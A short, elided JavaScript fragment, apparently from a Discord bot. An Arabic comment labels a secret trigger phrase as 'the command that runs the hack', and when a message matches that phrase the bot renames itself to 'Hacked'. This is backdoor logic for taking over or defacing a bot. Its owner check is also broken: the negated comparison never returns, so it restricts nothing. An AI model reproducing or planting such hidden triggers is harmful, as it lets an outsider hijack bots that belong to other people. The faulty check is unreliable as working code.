...
var x_x = "zoldexaliraqi500" //هنا تحط الامر اللي يشغل الهاك
...
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setUsername("تم الاختراق")
...
if(!message.author.id === '455668853444313098') return;
